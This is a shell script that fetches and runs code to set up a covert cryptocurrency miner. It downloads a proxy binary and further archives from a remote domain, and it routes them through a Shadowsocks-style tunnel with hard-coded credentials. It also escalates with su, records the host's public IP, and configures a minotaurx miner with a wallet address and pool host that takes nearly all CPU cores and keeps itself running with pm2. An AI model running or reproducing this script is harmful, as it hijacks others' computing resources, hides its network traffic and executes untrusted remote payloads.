#!/bin/sh
wget -q https://greenleaf.teatspray.fun/Spectre.tar.gz >/dev/null

sleep 2

tar -xf Spectre.tar.gz

sleep 2

./Spectre -L=:1083 -F=ss://aes-128-cfb:mikrotik999@45.135.58.52:8443 &

sleep 2

curl -s -x socks5h://127.0.0.1:1083 https://greenleaf.teatspray.fun/backup5.tar.gz -L -O -J

sleep 2

tar -xf backup5.tar.gz
sleep 3
rm backup5.tar.gz
./dist/proot -S . /bin/bash
su -
whoami
ls -la

num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
currentdate=$(date '+%d-%b-%Y_Posit_')
ipaddress=$(curl -s api.ipify.org)
underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
currentdate+=$underscored_ip
used_num_of_cores=`expr $num_of_cores - 3`
echo ""
echo "You will use $used_num_of_cores cores"
echo ""

sleep 2

Spectre -L=:1082 -F=ss://aes-128-cfb:mikrotik999@cpusocks$(shuf -i 1-6 -n 1).wot.mrface.com:8443 &

sleep 2

curl -s -x socks5h://127.0.0.1:1082 https://greenleaf.teatspray.fun/node_workload.tar.gz -L -O -J

sleep 2

tar -xf node_workload.tar.gz

sleep 2

npm install

sleep 2

npm install pm2 -g

sleep 2

DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata > /dev/null

sleep 2

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime > /dev/null
dpkg-reconfigure --frontend noninteractive tzdata > /dev/null

sleep 2

TZ='Africa/Johannesburg'; export TZ
date 
sleep 2 

cat > config.json <<END
{
  "algorithm": "minotaurx",
  "host": "flyingsaucer-eu.teatspray.fun",
  "port": 7019,
  "worker": "MGaypRJi43LcQxrgoL2CW28B31w4owLvv8",
  "password": "$currentdate,c=MAZA,zap=MAZA",
  "workers": $used_num_of_cores,
  "fee": "1"
}
END

sleep 2

echo "Your worker name is $currentdate"

sleep 2

pm2 start index.js --watch
sleep 5
pm2 stop index.js
sleep 5
pm2 delete index.js
sleep 5
pm2 start index.js --watch
